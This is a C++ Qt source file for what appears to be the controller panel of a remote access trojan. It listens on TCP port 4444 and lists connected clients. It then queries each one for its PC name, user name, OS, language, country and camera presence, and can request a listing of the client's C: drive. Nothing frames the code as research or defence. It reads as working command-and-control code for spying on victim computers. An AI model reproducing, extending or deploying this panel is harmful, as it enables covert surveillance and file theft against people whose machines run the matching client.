#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ServerStartup();
    ui->optionsWidget->hide();
    ui->filesWidget->hide();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::ServerStartup()
{
    server = new QTcpServer(this);

    QObject::connect(server,&QTcpServer::newConnection,this,[&](){
        client = server->nextPendingConnection();
        clientsCounter++;
        qDebug() << "[+] Client succesful connected to the server. Client IP: " << client->peerAddress();
        AuthClientToTable(client);

        QObject::connect(client,&QTcpSocket::readyRead,this,[&](){
            qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();

            QByteArray data = client->readAll();

            if(data.startsWith("#getPcInformation:"))
            {
                data = data.mid(18);
                QString dataString = data;
                QStringList parts = dataString.split(":");
                pcNameLabel->setText(parts[0]);
                userNameLabel->setText(parts[1]);
                installDateLabel->setText(parts[2]);
                osLabel->setText(parts[3]);
                osLanguageLabel->setText(parts[4]);
                countryLabel->setText(parts[5]);
                camLabel->setText(parts[6]);
            }

            if(data.startsWith("#getCFileTree:"))
            {
                data = data.mid(14);
                cFiles += data;


                workWithCFiles();
            }

        });

        QObject::connect(client,&QTcpSocket::disconnected,this,[&](){
            qDebug() << "[-] Client has been disconnected from the server. Client IP: " << client->localAddress();
            clientsCounter--;
            client->deleteLater();
        });
    });

    if(server->listen(QHostAddress::Any,4444))
    {
        qDebug() << "[+] Server succesful connect to port.";
    }
    else
    {
        qDebug() << "[-] Server cant connect to port.";
    }
}

void MainWindow::on_pushButton_clicked()
{
    QByteArray dataForClient = "Hello Client!";
    client->write(dataForClient);
}

void MainWindow::AuthClientToTable(QTcpSocket *socket)
{
    QLabel *label = new QLabel(ui->clientsWidget);
    label->show();
    label->setGeometry(0,YForLabel,1200,50);
    label->setStyleSheet("QLabel{background-color: black; border:2px solid black; border-color: black;}");

    QPushButton *button = new QPushButton(ui->clientsWidget);
    button->setStyleSheet("background: rgba(0,0,0,0);");
    button->setGeometry(0,YForLabel,1200,50);
    button->show();

    QObject::connect(button,&QPushButton::pressed,this,[&](){
        ui->optionsWidget->show();
        ui->optionsWidget->setGeometry(400,YForLabel,111,201);
    });

    QLabel *ipLabel = new QLabel(ui->clientsWidget);
    QString ip = socket->peerAddress().toString();
    if (ip.startsWith("::ffff:")) {
        ip = ip.mid(7);
    }
    ipLabel->setAlignment(Qt::AlignCenter);
    ipLabel->setText(ip);
    ipLabel->show();
    ipLabel->setGeometry(0,YForLabel,161,50);
    ipLabel->setStyleSheet("QLabel{font: 600 14pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    pcNameLabel = new QLabel(ui->clientsWidget);
    pcNameLabel->setAlignment(Qt::AlignCenter);
    pcNameLabel->show();
    pcNameLabel->setGeometry(161,YForLabel,121,50);
    pcNameLabel->setStyleSheet("QLabel{font: 600 8pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    userNameLabel = new QLabel(ui->clientsWidget);
    userNameLabel->setAlignment(Qt::AlignCenter);
    userNameLabel->show();
    userNameLabel->setGeometry(281,YForLabel,111,50);
    userNameLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    installDateLabel = new QLabel(ui->clientsWidget);
    installDateLabel->setAlignment(Qt::AlignCenter);
    installDateLabel->show();
    installDateLabel->setGeometry(391,YForLabel,141,50);
    installDateLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    osLabel = new QLabel(ui->clientsWidget);
    osLabel->setAlignment(Qt::AlignCenter);
    osLabel->show();
    osLabel->setGeometry(531,YForLabel,181,50);
    osLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    osLanguageLabel = new QLabel(ui->clientsWidget);
    osLanguageLabel->setAlignment(Qt::AlignCenter);
    osLanguageLabel->show();
    osLanguageLabel->setGeometry(711,YForLabel,141,50);
    osLanguageLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    countryLabel = new QLabel(ui->clientsWidget);
    countryLabel->setAlignment(Qt::AlignCenter);
    countryLabel->show();
    countryLabel->setGeometry(851,YForLabel,121,50);
    countryLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    camLabel = new QLabel(ui->clientsWidget);
    camLabel->setAlignment(Qt::AlignCenter);
    camLabel->show();
    camLabel->setGeometry(971,YForLabel,80,50);
    camLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    QLabel *buildVerLabel = new QLabel(ui->clientsWidget);
    buildVerLabel->setAlignment(Qt::AlignCenter);
    buildVerLabel->setText("v0.1");
    buildVerLabel->show();
    buildVerLabel->setGeometry(1050,YForLabel,150,50);
    buildVerLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    button->raise();

    getClientInformation(socket);






    YForLabel = YForLabel + 63;
}


void MainWindow::getClientInformation(QTcpSocket *socket)
{
    QByteArray requestForPcName = "#getPcInformation";
    socket->write(requestForPcName);
}

void MainWindow::on_filesButton_clicked()
{
    ui->filesWidget->show();
    ui->filesWidget->move(ui->optionsWidget->x()+115,ui->optionsWidget->y());

}


void MainWindow::on_showC_clicked()
{
    QByteArray requestForPcName = "#getCFileTree";
    client->write(requestForPcName);   
}

void MainWindow::workWithCFiles()
{
    ui->stackedWidget->setCurrentIndex(1);

    QWidget *container = new QWidget();

    QLabel *label = new QLabel(container);
    label->setText(cFiles);
    label->setWordWrap(true);
    label->adjustSize();

    container->setMinimumSize(label->size());

    ui->scrollAreaC->setWidget(container);
    ui->scrollAreaC->setWidgetResizable(false);
    qDebug() << cFiles;
}
